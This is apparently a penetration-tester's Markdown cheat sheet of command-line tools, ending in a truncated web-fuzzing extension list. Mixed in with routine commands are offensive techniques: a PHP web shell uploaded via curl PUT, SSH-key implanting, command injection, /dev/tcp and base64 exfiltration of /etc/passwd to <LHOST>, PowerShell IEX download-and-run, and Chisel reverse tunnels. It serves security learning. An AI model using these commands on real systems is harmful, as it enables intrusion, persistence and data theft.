# Basics

- [Resources](#resources)

## Table of Contents

- [.NET](#net)
- [2to3](2to3)
- [7z](#7z)
- [adb (Andoid Debug Bridge)](#adb-andoid-debug-bridge)
- [ar](#ar)
- [ash](#ash)
- [ack](#ack)
- [ASCII](#ascii)
- [awk](#awk)
- [Bash](#bash)
- [Bash Listenning Ports](#bash-listening-ports)
- [Bash POSIX](#bash-posix)
- [cadaver](#cadaver)
- [capsh](#capsh)
- [certutil](#certutil)
- [changelist](#changelist)
- [Chisel](#chisel)
- [chmod](#chmod)
- [gcc](#gcc)
- [Copy Files (Bash only)](#copy-files-bash-only)
- [Core Dump](#core-dump)
- [curl](#curl)
- [dig](#dig)
- [dos2unix](#dos2unix)
- [dpkg](#dpkg)
- [echo](#echo)
- [egrep](#egrep)
- [faketime](#faketime)
- [fg](#fg)
- [file](#file)
- [File Transfer](#file-transfer)
- [find](#find)
- [findmnt](#findmnt)
- [for loop](#for-loop)
- [FTP](#ftp)
- [getent](#getent)
- [getfacl](#getfacl)
- [gin](#gin)
- [Git](#git)
- [Gitea](#gitea)
- [glab](#glab)
- [Go](#go)
- [goshs](#goshs)
- [gpg](#gpg)
- [grep](#grep)
- [grpc](#grpc)
- [host](#host)
- [icacls](#icacls)
- [IMAP](#imap)
- [inotifywait](#inotifywait)
- [IPython](#ipython)
- [Java](#java)
- [jq](#jq)
- [KeePassXC](#keepassxc)
- [Kerberos](#kerberos)
- [ldd](#ldd)
- [less](#less)
- [lftp](#lftp)
- [Ligolo-ng](#ligolo-ng)
- [Linux](#linux-1)
- [Logfiles](#logfiles)
- [Logging](#logging)
- [Microsoft Windows](#microsoft-windows)
- [mkpasswd](#mkpasswd)
- [mount](#mount)
- [Mozilla Firefox](#mozilla-firefox)
- [mp64](#mp64)
- [msg](#msg)
- [Nano](#nano)
- [nc / Ncat / netcat](#nc--ncat--netcat)
- [Network File System (NFS)](#network-file-system-nfs)
- [NetworkManager](#networkmanager)
- [nfsshell](#nfsshell)
- [npx](#npx)
- [nsupdate](#nsupdate)
- [objectdump](#objectdump)
- [OpenBSD](#openbsd)
- [Outlook](#outlook)
- [paste](#paste)
- [Perl](#perl)
- [pgrep](#pgrep)
- [PHP](#php)
- [pipenv](#pipenv)
- [plink](#plink)
- [PNG](#png)
- [POP3](#pop3)
- [Port Forwarding](#port-forwarding-1)
- [PowerShell](#powershell-1)
- [printf](#printf)
- [proc](#proc)
- [ProFTP](#proftp)
- [ProFTPD](#proftpd)
- [Python2](#python2)
- [Python](#python)
- [Python TOTP](#python-totp)
- [rdate](#rdate)
- [rdesktop](#rdesktop)
- [readpst](#readpst)
- [regedit](#regedit)
- [rev](#rev)
- [Reverse SSH](#reverse-ssh)
- [rlogin](#rlogin)
- [rlwrap](#rlwrap)
- [rpm2cpio](#rpm2cpio)
- [rsh](#rsh)
- [rsync](#rsync)
- [RunAs](#runas)
- [screen](#screen)
- [sendemail](#sendemail)
- [seq](#seq)
- [SetUID Bit](#setuid-bit)
- [sftp](#sftp)
- [showmount](#showmount)
- [SIGSEGV](#sigsegv)
- [simpleproxy](#simpleproxy)
- [SMB](#smb)
- [smbcacls](#smbcacls)
- [smbclient](#smbclient)
- [smbget](#smbget)
- [smbmap](#smbmap)
- [smbpasswd](#smbpasswd)
- [socat](#socat)
- [Spaces Cleanup](#spaces-cleanup)
- [squid](#squid)
- [squidclient](#squidclient)
- [SSH](#ssh)
- [SSH Shell](#ssh-shell)
- [sshpass](#sshpass)
- [stat](#stat)
- [strace](#strace)
- [stty](#stty)
- [strings](#strings)
- [SVN](#svn)
- [swaks](#swaks)
- [systemd](#systemd)
- [tee](#tee)
- [tftp](#tftp)
- [timedatectl](#timedatectl)
- [Time and Date](#time-and-date)
- [Tmux](#tmux)
- [TTL](#ttl)
- [utf8cleaner](#utf8cleaner)
- [uv](#uv)
- [VDH](#vdh)
- [vim](#vim)
- [VirtualBox](#virtualbox)
- [virtualenv](#virtualenv)
- [wget](#wget)
- [while loop](#while-loop)
- [Writeable Directories](#writeable-directories)
- [Windows Subsystem for Linux (WSL)](#windows-subsystem-for-linux-wsl)
- [Wine](#wine)
- [wsgidav](#wsgidav)
- [X](#x)
- [xfreerdp3](#xfreerdp3)
- [xvfb](#xvfb)
- [Zip](#zip)
- [zipgrep](#zipgrep)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Chisel | A fast TCP/UDP tunnel over HTTP | https://github.com/jpillora/chisel |
| CyberChef | The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis. | https://gchq.github.io/CyberChef |
| graftcp | A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy. | https://github.com/hmgle/graftcp |
| Ligolo-ng | An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface. | https://github.com/nicocha30/ligolo-ng |
| MailHog | Web and API based SMTP testing | https://github.com/mailhog/MailHog |
| MicroSocks | tiny, portable SOCKS5 server with very moderate resource usage | https://github.com/rofl0r/microsocks |
| Reverse SSH | SSH based reverse shell | https://github.com/NHAS/reverse_ssh |
| socat | Mirror of the socat source code with pre-built releases for Linux (x64 and x86), Windows (x64 and x86), and MacOS (x64) | https://github.com/3ndG4me/socat |
| Swaks | Swiss Army Knife for SMTP | https://github.com/jetmore/swaks |
| up-http-tool | Simple HTTP listener for security testing | https://github.com/MuirlandOracle/up-http-tool |

## .NET

### List available Versions

```cmd
C:\> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
```

## 2to3

```console
$ 2to3 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
$ 2to3-2.7 <OLD_PYTHON_SCRIPT>.py -w <NEW_PYTHON_SCRIPT>.py
```

## 7z

### List Files in Archive and Technical Information

```console
$ 7z l -slt <FILE>
```

### Extract Archive

```console
$ 7z x <FILE>
```

## adb (Andoid Debug Bridge)

```console
$ adb connect <RHOST>:5555
$ adb shell
$ adb devices
$ adb install <file>.apk
```

### Set Proxy

```console
$ adb shell settings put global http_proxy <LHOST>:<LPORT>
```

## ar

### Unpacking .deb Files

```console
$ ar x <FILE>.deb
```

## ash

### Interactive Shell sdterr to sdtout

```console
$ ash -i 2>&1
```

## ack

```console
$ ack -i '<STRING>'    // like password
```

## ASCII

```console
$ man ascii
```

## awk

### Use . as Seperator

```console
$ awk -F. '{print $1}' <FILE>
```

### Field Seperator is ":" and it prints the output from Row 3

```console
$ awk -F':' '{print $3}'
```

### Print Line Number 1 and 42

```console
$ awk 'NR==1 || NR==42'
```

```console
$ awk '{print "http://<LHOST>/documents/" $0;}' ../files.txt | xargs -n 1 -P 16 wget  -q -P /PATH/TO/FOLDER/
```

## Bash

### Execute Privilege

```console
$ bash -p
```

## Bash Listening Ports

```console
$ S=(- ESTABLISHED SYN_SENT SYN_RECV FIN_WAIT1 FIN_WAIT2 TIME_WAIT CLOSE CLOSE_WAIT LAST_ACK LISTEN CLOSING);hex2ipport(){ printf '%d.%d.%d.%d:%d\n' $(echo $1|awk -F: '{print $1}'|sed 's/../0x& /g'|awk '{print $4" "$3" "$2" "$1}') 0x$(echo $1|awk -F: '{print $2}');};cat /proc/net/tcp|tail -n +2|while read L;do echo $(hex2ipport $(echo $L|awk '{print $2}')) $(hex2ipport $(echo $L|awk '{print $3}')) ${S[$(( 0x$(echo $L|awk '{print $4}') ))]};done
```

## Bash POSIX

```console
$ sls -b '
> bash -p'
bash-4.3$
```

## cadaver

### Accessing WebDAV

```console
$ cadaver http://<RHOST>/webdav
```

## capsh

```console
$ capsh --print
```

## certutil

### Show Certificates

```cmd
PS C:\> certutil -store My
```

### Export Certificate

```cmd
PS C:\> certutil -exportPFX My 75b2f4bbd71f108945247b466161bdph <FILE>.pfx
```

### Copy Files

```cmd
PS C:\> certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

## changelist

### BSD

```console
$ cat /etc/changelist
```

## Chisel

> https://github.com/jpillora/chisel

### Reverse Pivot

#### Server

```console
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```console
$ ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
```

##### With PowerShell Start-Process (saps)

```cmd
PS C:\> saps 'C:\chisel.exe' 'client <LHOST>:9002 R:3000:127.0.0.1:3000'
```

#### Forwaord multiple Ports at once

```console
$ ./chisel client <LHOST>:9002 R:8001:127.0.0.1:8001 R:8002:127.0.0.1:8002 R:8003:127.0.0.1:8003
```

### SOCKS5 / Proxychains Configuration

#### Server

```console
$ ./chisel server -p 9002 -reverse -v
```

#### Client

```console
$ ./chisel client <LHOST>:9002 R:socks
```

## chmod

### SUID Bit

```console
$ chmod +s <FILE>
$ chmod u+s <FILE>
$ chmod 4777 <FILE>
```

## gcc

```console
$ gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
```

### Linux

```console
$ gcc -m32|-m64 -o output source.c
```

### Windows

```console
$ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
```

## Copy Files (Bash only)

### wget Version

Paste directly to the Shell.

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

#### Usage

```console
__wget http://<LHOST>/<FILE>
```

### curl Version

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

### Usage

```console
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

## Core Dump

### Generate Core Dump

```console
$ kill -BUS <PROCESS_ID>
```

### Extract Core Dump

```console
$ apport-unpack /var/crash/_<PATH/TO/CRASHED/PROCESS>_<PROCESS>.1000.crash /PATH/TO/FOLDER/
```

## curl

### Common Commands

```console
$ curl -v http://<DOMAIN>                                                        // verbose output
$ curl -X POST http://<DOMAIN>                                                   // use POST method
$ curl -X PUT http://<DOMAIN>                                                    // use PUT method
$ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
$ curl -s "http://<DOMAIN>/reports.php?report=2589" | grep Do -A8 | html2text    // silent mode and output conversion
$ curl -F myFile=@<FILE> http://<RHOST>                                          // file upload
$ curl "http://<RHOST>/($whoami)"                                                // execute commands
$ curl${IFS}<LHOST>/<FILE>                                                       // Internal Field Separator (IFS) example
```

### Reference for -X

> https://daniel.haxx.se/blog/2015/09/11/unnecessary-use-of-curl-x/

### Headers

```console
$ curl -vvv <RHOST>
```

or

```console
$ curl -s -q -v -H 'Origin: http://<RHOST>' <DOMAIN>/api/auth
```

### Use SSL

```console
$ curl -k <RHOST>
```

### Use Proxy

```console
$ curl --proxy http://127.0.0.1:8080
```

### Web Shell Upload

```console
$ curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://<RHOST>/PATH/TO/DIRECTORY/<FILE>.php
$ curl -X PUT -T /usr/share/webshells/aspx/cmdasp.aspx "http://<RHOST>/sh.aspx"
$ curl -X MOVE -H "Destination: http://<RHOST>/sh.aspx" http://<RHOST>/sh.txt
```

### SSH Key Upload

```console
$ curl -G 'http://<RHOST>/<WEBSHELL>.php' --data-urlencode 'cmd=echo ssh-rsa AAAA--- snip --- 5syQ > /home/<USERNAME>/.ssh/authorized_keys'
```

### Command Injection

```console
$ curl -X POST http://<RHOST>/select --data 'db=whatever|id'
```

### File upload from local Web Server to Remote System

```console
$ curl http://<LHOST>/nc.exe -o c:\users\<USERNAME>\nc.exe
```

### File Download via Command Injection

```console
$ curl --silent -X POST http://<RHOST>/select --data 'db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem' | grep -zo '\-\-.*\-\-' > intermediate.cert.pem
```

### Get Server Time

```console
$ curl --head http://<RHOST>/
```

### curl Injection with Burp Suite

```console
-o /var/www/html/uploads/shell.php http://<LHOST>/shell.php
```

## dig

### Banner Grabbing

```console
$ dig version.bind CHAOS TXT @<RHOST>
$ dig ANY @<RHOST> <DOMAIN>
$ dig A @<RHOST> <DOMAIN>
$ dig AAAA @<RHOST> <DOMAIN>
$ dig TXT @<RHOST> <DOMAIN>
$ dig MX @<RHOST> <DOMAIN>
$ dig NS @<RHOST> <DOMAIN>
$ dig -x <RHOST> @<RHOST>
```

### Zone Transfer

```console
$ dig axfr @<RHOST>
$ dig axfr @<RHOST> <DOMAIN>
```

### Dir

```cmd
C:\> dir flag* /s /p
C:\> dir /s /b *.log
```

## Docker

### Starting Container and mount Directory on Host

```console
$ docker run -it -v $(pwd):/app <CONTAINER>
```

#### Gopherus Example

```
$ cd /opt/Gopherus
$ sudo docker run -v $(pwd):/Gopherus -it --rm --name Gopherus python:2.7.18-buster bash
$ cd /Gopherus
$ ./install.sh
```

## dos2unix

```console
$ dos2unix <FILE>.sh
```

## dpkg

### Files which changed in the last 2 Minutes

```console
$ dpkg -V 2>/dev/null
```

## echo

### Remove "\n"

```console
$ echo -e "string\n" > <FILE>
```

## egrep

### Search for IPv6 Addresses

```console
$ egrep '(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]).){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))'
```

## Environment Variables

```console
$ env
$ echo $PATH
```

### Export Path

```console
$ echo $PATH
$ export PATH=`pwd`:$PATH
```

## faketime

```console
$ faketime 'last friday 5 pm' /bin/date
$ faketime '2008-12-24 08:15:42' /bin/date
$ faketime -f '+2,5y x10,0' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
$ faketime -f '+2,5y x0,50' /bin/bash -c 'date; while true; do echo $SECONDS ; sleep 1 ; done'
$ faketime -f '+2,5y i2,0' /bin/bash -c 'date; while true; do date; sleep 1 ; done'
```

### Proxychains and Kerberos

```console
$ proxychains faketime -f +1h kinit -V -X X509_user_identity=FILE:admin.cer,admin.key administrator@WINDCORP.HTB
```

## fg

```console
$ fg
```

## file

```console
$ file <file>
```

## File Transfer

> https://gtfobins.github.io/#+file%20upload

### Bash File Transfer

#### To the Target

```console
$ bash -c "cat < /dev/tcp/<RHOST>/<RPORT> > <FILE>"
$ nc -lnvp <LPORT> > <FILE>
```

#### From the Target

```console
$ bash -c "cat < <FILE> > /dev/tcp/<RHOST>/<RPORT>" 
$ nc -lnvp <LPORT> > <FILE>
```

### cancel

```console
$ nc -nlvp 18110
$ cancel -u "$(cat /etc/passwd | base64)" -h <LHOST>:<LPORT>
```

### rlogin

```console
$ rlogin -l "$(cat /etc/passwd | base64)" -p <LPORT> <LHOST>
```

### Linux to Windows

```cmd
PS C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<LOCAL_DIRECTORY>/<FILE>','C:\Users\<USERNAME>\Documents\<FILE>')"
```

### Windows to Linux

```console
$ impacket-smbserver <SHARE> . -smb2support
```

```cmd
C:\> copy * \\<LHOST>\<SHARE>
```

#### Authenticated

```console
$ impacket-smbserver -smb2support share <FOLDER> -user <USERNAME> -password <PASSWORD>
```

```cmd
C:\> net use n: \\<LHOST>\share /user:<USERNAME> <PASSWORD>
```

### Windows to Linux using Invoke-Webrequest

```cmd
PS C:\> powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
```

#### Short Version

```cmd
PS C:\> iwr <LHOST>/<FILE> -o <FILE>
PS C:\> iwr <LHOST>/<FILE> -o <FILE> -useb
PS C:\> iwr <LHOST>/<FILE> -o <FILE> -UseBasicParsing
PS C:\> IEX(IWR http://<LHOST>/<FILE>)
PS C:\> IEX(IWR http://<LHOST>/<FILE>) -useb
PS C:\> IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
```

### FTP Server

```console
$ sudo msfconsole
msf6 > use auxiliary/server/ftp
msf6 auxiliary(server/ftp) > set FTPROOT /home/kali/htb/machines/sauna/serve/
FTPROOT => /home/kali/htb/machines/sauna/serve/
msf6 auxiliary(server/ftp) > exploit
[*] Auxiliary module running as background job 0.
```

## Filetypes

```console
.php
.html
.txt
.htm
.aspx
.asp
.js
.css
.pgsql.txt
.mysql.txt
.pdf
.cgi
.inc
.gif
.jpg
.swf
.xml
.cfm
.xhtml
.wmv
.zip
.axd
.gz
.png
.doc
.shtml
.jsp
.ico
.exe
.csi
.inc.php
.config
.jpeg
.ashx
.log
.xls
.0
.old
.mp3
.com
.tar
.ini
.asa
.tgz
.PDF
.flv
.php3
.bak
.rar
.asmx
.xlsx
.page
.phtml
.dll
.JPG
.asax
.1
.msg
.pl
.GIF
.ZIP
.csv
.css.aspx
.2
.JPEG
.3
.ppt
.nsf
.Pdf
.Gif
.bmp
.sql
.Jpeg
.Jpg
.xml.gz
.Zip
.new
.avi
.psd
.rss
.5
.wav
.action
.db
.dat
.do
.xsl
.class
.mdb
.include
.12
.cs
.class.php
.htc
.mov
.tpl
.4
.6.12
.9
.js.php
.mysql-connect
.mpg
.rdf
.rtf
.6
.ascx
.mvc
.1.0
.files
.master
.jar
.vb
.mp4
.local.php
.fla
.require
.de
.docx
.php5
.wci
.readme
.7
.cfg
.aspx.cs
.cfc
.dwt
.ru
.LCK
.Config
.gif_var_DE
.html_var_DE
.net
.ttf
.HTM
.X-AOM
.jhtml
.mpeg
.ASP
.LOG
.X-FANCYCAT
.php4
.readme_var_DE
.vcf
.X-RMA
.X-AFFILIATE
.X-OFFERS
.X-AFFILIATE_var_DE
.X-AOM_var_DE
.X-FANCYCAT_var_DE
.X-FCOMP
.X-FCOMP_var_DE
.X-GIFTREG
.X-GIFTREG_var_DE
.X-MAGNIFIER
.X-MAGNIFIER_var_DE
.X-OFFERS_var_DE
.X-PCONF
.X-PCONF_var_DE
.X-RMA_var_DE
.X-SURVEY
.tif
.dir
.json
.6.9
.Zif
.wma
.8
.mid
.rm
.aspx.vb
.tar.gz
.woa
.main
.ram
.opml
.0.html
.css.php
.feed
.lasso
.6.3
.shtm
.sitemap
.scc
.tmp
.backup
.sln
.org
.conf
.mysql-query
.session-start
.uk
.10
.14
.TXT
.orig
.settings.php
.19
.cab
.kml
.lck
.pps
.require-once
.asx
.bok
.msi
.01
.c
.fcgi
.fopen
.html.
.phpmailer.php
.bin
.htaccess
.info
.java
.jsf
.tmpl
.0.2
.00
.6.19
.DOC
.bat
.com.html
.print
.resx
.ics
.php.php
.x
.PNG
.data
.dcr
.enfinity
.html.html
.licx
.mno
.plx
.vm
.11
.5.php
.50
.HTML
.MP3
.config.php
.dwg
.edu
.search
.static
.wws
.6.edu
.OLD
.bz2
.co.uk
.ece
.epc
.getimagesize
.ice
.it_Backup_Giornaliero
.it_Backup_Settimanale
.jspa
.lst
.php-dist
.svc
.vbs
.1.html
.30-i486
.ai
.cur
.dmg
.img
.inf
.seam
.smtp.php
.1-bin-Linux-2.0.30-i486
.1a
.34
.5.3
.7z
.ajax
.cfm.cfm
.chm
.csp
.edit
.file
.gif.php
.m3u
.psp
.py
.sh
.test
.zdat
.04
.2.2
.4.0
.admin
.captcha.aspx
.dev
.eps
.file-get-contents
.fr
.fsockopen
.list
.m4v
.min.js
.new.html
.p
.store
.webinfo
.xml.php
.3.2
.5.0
.BAK
.htm.
.php.bak
.1.1
.1c
.300
.5.1
.790
.826
.bk
.bsp
.cms
.csshandler.ashx
.d
.html,
.htmll
.idx
.images
.jad
.master.cs
.prev_next
.ssf
.stm
.txt.gz
.00.8169
.01.4511
.112
.134
.156
.2.0
.21
.24
.4.9.php
.4511
.8169
.969
.Web.UI.WebResource.axd
.as
.asp.asp
.au
.cnf
.dhtml
.enu
.html.old
.include-once
.lock
.m
.mysql-select-db
.phps
.pm
.pptx
.sav
.sendtoafriendform
.ssi
.suo
.vbproj
.wml
.xsd
.025
.075
.077
.083
.13
.16
.206
.211
.246
.26.13.391N35.50.38.816
.26.24.165N35.50.24.134
.26.56.247N35.52.03.605
.27.02.940N35.49.56.075
.27.15.919N35.52.04.300
.27.29.262N35.47.15.083
.367
.3gp
.40.00.573N35.42.57.445
.403
.43.58.040N35.38.35.826
.44.04.344N35.38.35.077
.44.08.714N35.39.08.499
.44.10.892N35.38.49.246
.44.27.243N35.41.29.367
.44.29.976N35.37.51.790
.44.32.445N35.36.10.206
.44.34.800N35.38.08.156
.44.37.128N35.40.54.403
.44.40.556N35.40.53.025
.44.45.013N35.38.36.211
.44.46.104N35.38.22.970
.44.48.130N35.38.25.969
.44.52.162N35.38.50.456
.44.58.315N35.38.53.455
.445
.45.01.562N35.38.38.778
.45.04.359N35.38.39.112
.45.06.789N35.38.22.556
.45.10.717N35.38.41.989
.455
.456
.499
.556
.605
.778
.816
.970
.989
.ASPX
.JS
.PHP
.array-keys
.atom
.award
.bkp
.crt
.default
.eml
.epl
.fancybox
.fil
.geo
.h
.hmtl
.html.bak
.ida
.implode
.index.php
.iso
.kmz
.mysql-pconnect
.php.old
.php.txt
.rec
.storefront
.taf
.war
.xslt
.1.6
.15
.23
.2a
.8.1
.CSS
.NSF
.Sponsors
.a
.aquery
.ascx.cs
.cat
.contrib
.ds
.dwf
.film
.g
.go
.googlebook
.gpx
.hotelName
.htm.htm
.ihtml
.in-array
.index
.ini.php
.layer
.maninfo
.odt
.price
.randomhouse
.read
.ru-tov.html
.s7
.sample
.sit
.src
.tpl.php
.trck
.uguide
.vorteil
.wbp
.2.1
.2.html
.3.1
.30
.AVI
.Asp
.EXE
.WMV
.asax.vb
.aspx.aspx
.btr
.cer
.common.php
.de.html
.html‎
.jbf
.lbi
.lib.php
.lnk
.login
.login.php
.mhtml
.mpl
.mso
.mysql-result
.original
.pgp
.ph
.php.
.preview
.preview-content.php
.search.htm
.site
.text
.view
.0.1
.0.5
.1.2
.2.9
.3.5
.3.html
.4.html
.5.html
.72
.ICO
.Web
.XLS
.action2
.asc
.asp.bak
.aspx.resx
.browse
.code
.com_Backup_Giornaliero
.com_Backup_Settimanale
.csproj
.dtd
.en.html
.ep
.eu
.form
.html1
.inc.asp
.index.html
.it
.nl
.ogg
.old.php
.old2
.opendir
.out
.pgt
.php,
.php‎
.po
.prt
.query
.rb
.rhtml
.ru.html
.save
.search.php
.t
.wsdl
.0-to1.2.php
.0.3
.03
.18
.2.6
.3.0
.3.4
.4.1
.6.1
.7.2
.CFM
.MOV
.MPEG
.Master
.PPT
.TTF
.Templates
.XML
.adp
.ajax.php
.apsx
.asf
.bck
.bu
.calendar
.captcha
.cart
.com.crt
.core
.dict.php
.dot
.egov
.en.php
.eot
.errors
.f4v
.fr.html
.git
.ht
.hta
.html.LCK
.html.printable
.ini.sample
.lib
.lic
.map
.master.vb
.mi
.mkdir
.o
.p7b
.pac
.parse.errors
.pd
.pfx
.php2
.php_files
.phtm
.png.php
.portal
.printable
.psql
.pub
.q
.ra
.reg
.restrictor.php
.rpm
.strpos
.tcl
.template
.tiff
.tv
.us
.user
.06
.09
.1.3
.1.5.swf
.2.3
.25
.3.3
.4.2
.6.5
.Controls
.WAV
.acgi
.alt
.array-merge
.back
.call-user-func-array
.cfml
.cmd
.cocomore.txt
.detail
.disabled
.dist.php
.djvu
.dta
.e
.extract
.file-put-contents
.fpl
.framework
.fread
.htm.LCK
.inc.js
.includes
.jp
.jpg.html
.l
.letter
.local
.num
.pem
.php.sample
.php}
.php~
.pot
.preg-match
.process
.ps
.r
.raw
.rc
.s
.search.
.server
.sis
.sql.gz
.squery
.subscribe
.svg
.svn
.thtml
.tpl.html
.ua
.vcs
.xhtm
.xml.asp
.xpi
.0.0
.0.4
.07
.08
.10.html
.17
.2008
.2011
.22
.25.html
.2ms2
.3.2.min.js
.32
.33
.4.6
.5.6
.6.0
.7.1
.91
.A
.PAGE
.SWF
.add
.array-rand
.asax.cs
.asax.resx
.ascx.vb
.aspx,
.aspx.
.awm
.b
.bhtml
.bml
.ca
.cache
.cfg.php
.cn
.cz
.de.txt
.diff
.email
.en
.error
.faces
.filesize
.functions.php
.hml
.hqx
.html,404
.html.php
.htmls
.htx
.i
.idq
.jpe
.js.aspx
.js.gz
.jspf
.load
.media
.mp2
.mspx
.mv
.mysql
.new.php
.ocx
.oui
.outcontrol
.pad
.pages
.pdb
.pdf.
.pnp
.pop_formata_viewer
.popup.php
.popup.pop_formata_viewer
.pvk
.restrictor.log
.results
.run
.scripts
.sdb
.ser
.shop
.sitemap.xml
.smi
.start
.ste
.swf.swf
.templates
.textsearch
.torrent
.unsubscribe
.v
.vbproj.webinfo
.web
.wmf
.wpd
.ws
.xpml
.y
.0.8
.0.pdf
.001
.1-all-languages
.1.pdf
.11.html
.125
.20
.20.html
.2007
.26.html
.4.7
.45
.5.4
.6.2
.6.html
.7.0
.7.3
.7.html
.75.html
.8.2
.8.3
.AdCode
.Aspx
.C.
.COM
.GetMapImage
.Html
.Run.AdCode
.Skins
.Z
.access.login
.ajax.asp
.app
.asd
.asm
.assets
.at
.bad
.bak2
.blog
.casino
.cc
.cdr
.changeLang.php
.children
.com,
.com-redirect
.content
.copy
.count
.cp
.csproj.user
.custom
.dbf
.deb
.delete
.details.php
.dic
.divx
.download
.download.php
.downloadCirRequirements.pdf
.downloadTourkitRequirements.pdf
.emailCirRequirements.php
.emailTourkitForm.php
.emailTourkitNotification.php
.emailTourkitRequirements.php
.epub
.err
.es
.exclude
.filemtime
.fillPurposes2.php
.grp
.home
.htlm
.htm,
.html-
.image
.inc.html
.it.html
.j
.jnlp
.js.asp
.js2
.jspx
.lang-en.php
.link
.listevents
.log.0
.mbox
.mc_id
.menu.php
.mgi
.mod
.net.html
.news
.none
.off
.p3p
.php.htm
.php.static
.php1
.phpp
.pop3.php
.pop_3D_viewer
.popup.pop_3D_viewer
.prep
.prg
.print.html
.print.php
.product_details
.pwd
.pyc
.red
.registration
.requirementsFeesTable.php
.roshani-gunewardene.com
.se
.sea
.sema
.session
.setup
.simplexml-load-file
.sitx
.smil
.srv
.swi
.swp
.sxw
.tar.bz2
.tem
.temp
.template.php
.top
.txt.php
.types
.unlink
.url
.userLoginPopup.php
.visaPopup.php
.visaPopupValid.php
.vspscc
.vssscc
.w
.work
.wvx
.xspf
.-
.-110,-maria-lund-45906.-511-gl.php
.-tillagg-order-85497.php
.0-rc1
.0.10
.0.11
.0.328.1.php
.0.329.1.php
.0.330.1.php
.0.6
.0.7
.0.806.1.php
.0.xml
.0.zip
.000
.002
.02
.030-i486
.05
.07.html
.1-3.2.php
.1-bin-Linux-2.030-i486
.1-pt_BR
.1.5
.1.8
.1.htm
.10.10
.11.2010
.12.html
.13.html
.131
.132
.15.html
.16.html
.2-rc1
.2.5
.2.8
.2.js
.2.pdf
.2004
.2006
.2009
.2010
.21.html
.23.html
.26
.27
.27.html
.29.html
.31
.35
.4.2.min.js
.4.4
.45.html
.5.1-pt_BR
.5.2
.5.7
.5.7-pl1
.6-all-languages
.6.14
.6.16
.6.18
.6.2-rc1
.62.html
.63.html
.64
.65
.66
.7-pl1
.762
.8.2.4
.8.5
.8.7
.80.html
.808
.85
.9.1
.90
.92
.972
.98.html
.Admin
.E.
.Engineer
.INC
.LOG.new
.MAXIMIZE
.MPG
.NDM
.Php
.R
.SIM
.SQL
.Services
.[file
.accdb
.act
.actions.php
.admin.php
.ads
.alhtm
.all
.ani
.apf
.apj
.ar
.aral-design.com
.aral-design.de
.arc
.array-key-exists
.asp.old
.asp1
.aspg
.bfhtm
.biminifinder
.br
.browser
.build
.buscar
.categorias
.categories
.ccs
.ch
.cl
.click.php
.cls
.cls.php
.cms.ad.AdServer.cls
.com-tov.html
.com.ar
.com.br
.com.htm
.com.old
.common
.conf.php
.contact.php
.control
.core.php
.counter.php
.coverfinder
.create.php
.cs2
.d2w
.dbm
.dct
.dmb
.doc.doc
.dxf
.ed
